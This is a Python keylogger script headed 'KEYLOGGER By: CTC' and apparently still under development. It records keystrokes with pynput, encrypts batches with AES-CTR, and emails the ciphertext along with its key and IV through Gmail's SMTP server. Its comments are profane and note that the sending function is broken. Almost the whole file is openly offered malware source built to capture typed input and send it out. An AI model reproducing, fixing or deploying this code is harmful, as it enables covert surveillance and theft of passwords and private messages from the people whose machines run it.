#! /usr/bin/python3

#Imports
import getpass
import smtplib
import Cryptodome
import pyaes, pbkdf2, binascii, os, secrets
from pynput.keyboard import Key, Listener
from Crypto.Random import get_random_bytes





# Logo
print ("""================================================================""")
print (r"""
 _   __ _____ __   __ _      _____  _____  _____  _____ ______ 
| | / /|  ___|\ \ / /| |    |  _  ||  __ \|  __ \|  ___|| ___ \
| |/ / | |__   \ V / | |    | | | || |  \/| |  \/| |__  | |_/ /
|    \ |  __|   \ /  | |    | | | || | __ | | __ |  __| |    / 
| |\  \| |___   | |  | |____\ \_/ /| |_\ \| |_\ \| |___ | |\ \ 
\_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                             """)
print ("""================================================================""")
print("""By: CTC """)

#Asks user for input, then sets up a mail account to send the input to
#Resource from: https://realpython.com/python-send-email/
email = input('Enter Your Email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#Defining the essential variables
converted_key = ''
converted_iv = ''
key = ''
plaintext = ''
ciphertext = ''
data_to_be_encrypted = ''
data_to_be_sent = ''
full_log = ''
word = ''
email_char_lim = 50
iv = ''

#Building the keylogger (seems to work just fine)
def on_press(key):
    global word
    global full_log
    global email
    global email_char_lim
    global data_to_be_encrypted
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
    if len(full_log) >= email_char_lim:
            data_to_be_encrypted = full_log
            full_log = ''
            if len(data_to_be_encrypted) >= email_char_lim:
               encryption()
               data_to_be_encrypted = ''
           
    elif key == Key.shift_l or key == Key.shift_r:
           return
    elif key == Key.backspace:
      word = word[:-1]
    else:
       char = f'{key}'
       char = char[1:-1]
       word += char
   
    if key == Key.esc:
     return False

#My most precious fucking encryption function i swear i will fucking kill this piece of shit code

def encryption():
    global converted_iv
    global converted_key
    global email_char_lim
    global key
    global iv
    global ciphertext
    global plaintext
    global data_to_be_sent
    global data_to_be_encrypted
    password = "passw0rd"
    key = get_random_bytes(32)
    iv = secrets.randbits(256)
    plaintext = data_to_be_encrypted
    aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
    ciphertext = aes.encrypt(plaintext)
    data_to_be_sent = ciphertext
    print(key)
    print(iv)
    converted_iv = str(iv)
    converted_key = str(key)
    
    
    #if the lenght of the ciphertext is more than the limit everything gets reseted
    if len(data_to_be_sent) >= email_char_lim:
        send_log()
        data_to_be_encrypted = ''
        plaintext = ''
        full_log = ''
        data_to_be_sent = ''
        ciphertext = ''



#This shit ddefines the send_log function which does not seem to work cuz int object has no attribute 'lower'
def send_log():
  global converted_iv
  global converted_key
  global data_to_be_sent
  server.sendmail(
          email,
          email,
          data_to_be_sent
     )
  server.sendmail(
          email,
          email,
          converted_iv
     )
  server.sendmail(
          email,
          email,
          converted_key
     )
#This stuff starts the listener shit
with Listener( on_press=on_press ) as listener:
      listener.join()
